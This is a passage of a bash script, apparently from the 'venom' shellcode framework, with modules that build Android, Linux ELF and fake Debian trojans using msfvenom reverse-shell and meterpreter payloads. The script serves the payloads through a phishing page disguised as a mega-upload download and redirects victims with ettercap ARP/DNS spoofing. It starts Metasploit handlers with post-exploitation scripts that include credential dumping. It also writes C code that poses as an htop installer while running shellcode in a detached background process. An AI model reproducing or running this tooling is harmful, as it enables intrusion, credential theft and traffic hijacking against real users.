\"s|NaM3|$N4m.zip|g\" mega.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.zip|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.zip $ApAcHe/$N4m.zip\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n           cd $IPATH/output\n           # delete utf-8/non-ancii caracters from output\n           tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n           sed -i \"s/\\[0m//g\" final.log\n           sed -i \"s/\\[1m\\[34m//g\" final.log\n           sed -i \"s/\\[4m//g\" final.log\n           sed -i \"s/\\[K//g\" final.log\n           sed -i \"s/\\[1m\\[31m//g\" final.log\n           sed -i \"s/\\[1m\\[32m//g\" final.log\n           sed -i \"s/\\[1m\\[33m//g\" final.log\n           mv final.log $N4m-$lhost.log > /dev/null 2>&1\n           rm report.log > /dev/null 2>&1\n           cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'\"\n          fi\n        fi\n   fi\n\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nsleep 2\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $IPATH/output/my-release-key.Keystore > /dev/null 2>&1\nrm $IPATH/output//$N4m.zip > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/$N4m.zip > /dev/null 2>&1\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_android_menu\n  clear\nfi\n}\n\n\n\n\n#\n# ELF agent (linux systems)\n#\nsh_elf () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"linux/ppc/shell_reverse_tcp\" FALSE \"linux/x86/shell_reverse_tcp\" FALSE \"linux/x86/meterpreter/reverse_tcp\" FALSE \"linux/x86/meterpreter_reverse_https\" FALSE \"linux/x64/shell/reverse_tcp\" FALSE \"linux/x64/shell_reverse_tcp\" FALSE \"linux/x64/meterpreter/reverse_tcp\" FALSE \"linux/x64/meterpreter/reverse_https\" FALSE \"linux/x64/meterpreter_reverse_https\" --width 400 --height 440) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: ElfPayload\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"ElfPayload\";fi\n\necho \"[☠] Building shellcode -> ELF format ..\"\nsleep 2\nif [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n   echo \"[☠] meterpreter over SSL sellected ..\";sleep 1\nfi\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : ELF -> LINUX\n    PAYLOAD : $paylo\n\n!\nsleep 1\n# use metasploit to build shellcode (msf encoded)\necho \"[☠] Using msfvenom to build agent ..\"\nsleep 2\n# if payload sellected its == then trigger SSL support\nif [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f elf > $IPATH/output/$N4m.elf\"\nelse\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f elf > $IPATH/output/$N4m.elf\"\nfi\n\nsleep 2\necho \"[☠] Give execution permitions to agent ..\"\nsleep 1\nchmod +x $IPATH/output/$N4m.elf > /dev/null 2>&1\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.elf\\n\\nchose how to deliver: $N4m.elf\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n\n          if [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n\n          if [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n        fi\n      sleep 2\n\n   else\n\n# post-exploitation\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"linux_hostrecon.rc\" FALSE \"dump_credentials_linux.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 260) > /dev/null 2>&1\n\n\nif [ \"$P0\" = \"linux_hostrecon.rc\" ]; then\n  if [ -e \"$pHanTom/post/linux/gather/linux_hostrecon.rb\" ]; then\n    echo \"[✔] linux_hostrecon.rb -> found\"\n    sleep 2\n  else\n    echo \"[x] linux_hostrecon.rb -> not found\"\n    sleep 1\n    echo \"[*] copy post-module to msfdb ..\"\n    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1\n    echo \"[☠] Reloading msfdb database ..\"\n    sleep 2\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n  fi\nfi\n\n\n      # edit files nedded\n      echo \"[☠] copy files to webroot...\"\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.elf|g\" mega.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.elf $ApAcHe/$N4m.elf > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.elf|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.elf $ApAcHe/$N4m.elf\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n\n           cd $IPATH/output\n           # delete utf-8/non-ancii caracters from output\n           tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n           sed -i \"s/\\[0m//g\" final.log\n           sed -i \"s/\\[1m\\[34m//g\" final.log\n           sed -i \"s/\\[4m//g\" final.log\n           sed -i \"s/\\[K//g\" final.log\n           sed -i \"s/\\[1m\\[31m//g\" final.log\n           sed -i \"s/\\[1m\\[32m//g\" final.log\n           sed -i \"s/\\[1m\\[33m//g\" final.log\n           mv final.log $N4m-$lhost.log > /dev/null 2>&1\n           rm report.log > /dev/null 2>&1\n           cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n          fi\n        fi\n   fi\n\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nsleep 2\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/$N4m.elf > /dev/null 2>&1\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_unix_menu\n  clear\nfi\n}\n\n\n\n#\n# DEBIAN agent (linux systems)\n#\nsh_debian () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"linux/ppc/shell_reverse_tcp\" FALSE \"linux/x86/shell_reverse_tcp\" FALSE \"linux/x86/meterpreter/reverse_tcp\" FALSE \"linux/x64/shell/reverse_tcp\" FALSE \"linux/x64/shell_reverse_tcp\" FALSE \"linux/x64/meterpreter/reverse_tcp\" --width 400 --height 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ LOGFILE NAME ☠\" --text \"Enter logfile output name\\nexample: DebMasquerade\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"DebMasquerade\";fi\n\necho \"[☠] Building shellcode -> C format ..\"\nsleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : C -> LINUX\n    PAYLOAD : $paylo\n\n!\nsleep 1\n# use metasploit to build shellcode (msf encoded)\necho \"[☠] Using msfvenom to build raw shellcode ..\"\nsleep 2\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw\"\n\n\necho \"[☠] Parsing shellcode data ..\"\nsleep 1\nparse=$(cat $IPATH/output/chars.raw | grep -v \"=\" | tr -d '\";' | tr -d '\\n' | tr -d ' ')\necho \"\"\necho \"unsigned char buf[] =\"\necho \"$parse\"\n\n\n\n# ----------------\n# BUILD C PROGRAM\n# ----------------\ncd $IPATH/output\necho \"#include<stdio.h>\" > htop.c\necho \"#include<stdlib.h>\" >> htop.c\necho \"#include<string.h>\" >> htop.c\necho \"#include<sys/types.h>\" >> htop.c\necho \"#include<sys/wait.h>\" >> htop.c\necho \"#include<unistd.h>\" >> htop.c\necho \"\" >> htop.c\necho \"/*\" >> htop.c\necho \"Author: r00t-3xp10it\" >> htop.c\necho \"Framework: venom v1.0.17\" >> htop.c\necho \"MITRE ATT&CK T1036 served as Linux RAT agent (trojan).\" >> htop.c\necho \"gcc -fno-stack-protector -z execstack htop.c -o htop_installer.deb\" >> htop.c\necho \"'Naming the compiled C program to .deb does not call the dpkg at runtime (MITRE ATT&CK T1036)'\" >> htop.c\necho \"*/\" >> htop.c\necho \"\" >> htop.c\necho \"/* msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c */\" >> htop.c\necho \"unsigned char voodoo[] = \\\"$parse\\\";\" >> htop.c\necho \"\" >> htop.c\necho \"int main()\" >> htop.c\necho \"{\" >> htop.c\necho \"   /*\" >> htop.c\necho \"   This fork(); function allow us to spawn a new child process (in background). This way i can\" >> htop.c\necho \"   execute shellcode in background while continue the execution of the C program in foreground.\" >> htop.c\necho \"   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c\" >> htop.c\necho \"   */\" >> htop.c\necho \"   fflush(NULL);\" >> htop.c\necho \"   int pid = fork();\" >> htop.c\necho \"      if (pid > 0) {\" >> htop.c\necho \"         /*\" >> htop.c\necho \"         We are runing in parent process (child its also running)\" >> htop.c\necho \"         Install/run htop proccess manager (as foreground job)\" >> htop.c\necho \"         */\" >> htop.c\necho \"         printf(\\\"+---------------------------------+\\\\\\n\\\");\" >> htop.c\necho \"         printf(\\\"|  install Htop proccess manager  |\\\\\\n\\\");\" >> htop.c\necho \"         printf(\\\"+---------------------------------+\\\\\\n\\\\\\n\\\");\" >> htop.c\necho \"         /* Display system information onscreen to target user */\" >> htop.c\necho \"         system(\\\"h=\\$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \\\\\\\"    Hostname :\\$h\\\\\\\"\\\");\" >> htop.c\necho \"         system(\\\"c=\\$(hostnamectl | grep 'Icon' | cut -d ':' -f2);echo \\\\\\\"    Icon     :\\$c\\\\\\\"\\\");\" >> htop.c\necho \"         system(\\\"o=\\$(hostnamectl | grep 'Operating' | cut -d ':' -f2);echo \\\\\\\"    OS       :\\$o\\\\\\\"\\\");\" >> htop.c\necho \"         system(\\\"k=\\$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \\\\\\\"    Kernel   :\\$k\\\\\\\"\\\");\" >> htop.c\necho \"\" >> htop.c\necho \"            /* Install htop package */\" >> htop.c\necho \"            sleep(1);printf(\\\"\\\\\\n[*] Please wait, Installing htop package ..\\\\\\n\\\");\" >> htop.c\necho \"            sleep(1);system(\\\"sudo apt-get update -qq && sudo apt-get install -y -qq htop\\\");\" >> htop.c\necho \"\" >> htop.c\necho \"         /* Execute htop proccess manager */\" >> htop.c\necho \"         system(\\\"f=\\$(htop -v | grep -m 1 'htop' | awk {'print \\$2'});echo \\\\\\\"[i] Htop package version installed: \\$f\\\\\\\"\\\");\" >> htop.c\necho \"\t       sleep(1);printf(\\\"[*] Please wait, executing htop software ..\\\\\\n\\\");\" >> htop.c\necho \"\t       sleep(3);system(\\\"htop\\\");\" >> htop.c\necho \"      }\" >> htop.c\necho \"      else if (pid == 0) {\" >> htop.c\necho \"         /*\" >> htop.c\necho \"         We are running in child process (as backgrond job - orphan).\" >> htop.c\necho \"         setsid(); allow us to detach the child (shellcode) from parent (htop_installer.deb) process,\" >> htop.c\necho \"         allowing us to continue running the shellcode in ram even if parent process its terminated.\" >> htop.c\necho \"         */\" >> htop.c\necho \"         setsid();\" >> htop.c\necho \"         void(*ret)() = (void(*)())voodoo;\" >> htop.c\necho \"         ret();\" >> htop.c\necho \"      } return 0;\" >> htop.c\necho \"}\" >> htop.c\n\n\necho \"\"\necho \"[☠] Compile C program (MITRE ATT&CK T1036) ..\"\nsleep 1\ngcc -fno-stack-protector -z execstack $IPATH/output/htop.c -o $IPATH/output/htop_installer.deb\n\n\nsleep 2\necho \"[☠] Give execution permitions to agent ..\"\nsleep 1\nchmod +x $IPATH/output/htop_installer.deb > /dev/null 2>&1\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/htop_installer.deb\\n\\nchose how to deliver: htop_installer.deb\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n\n          if [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n\n          if [ \"$paylo\" = \"linux/x86/meterpreter_reverse_https\" ] || [ \"$paylo\" = \"linux/x64/meterpreter_reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n        fi\n      sleep 2\n\n   else\n\n# post-exploitation\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"linux_hostrecon.rc\" FALSE \"dump_credentials_linux.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 260) > /dev/null 2>&1\n\n\nif [ \"$P0\" = \"linux_hostrecon.rc\" ]; then\n  if [ -e \"$pHanTom/post/linux/gather/linux_hostrecon.rb\" ]; then\n    echo \"[✔] linux_hostrecon.rb -> found\"\n    sleep 2\n  else\n    echo \"[x] linux_hostrecon.rb -> not found\"\n    sleep 1\n    echo \"[*] copy post-module to msfdb ..\"\n    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1\n    echo \"[☠] Reloading msfdb database ..\"\n    sleep 2\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n  fi\nfi\n\n\n      # edit files nedded\n      echo \"[☠] copy files to webroot...\"\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|htop_installer.deb|g\" mega.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp htop_installer.deb $ApAcHe/htop_installer.deb > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed 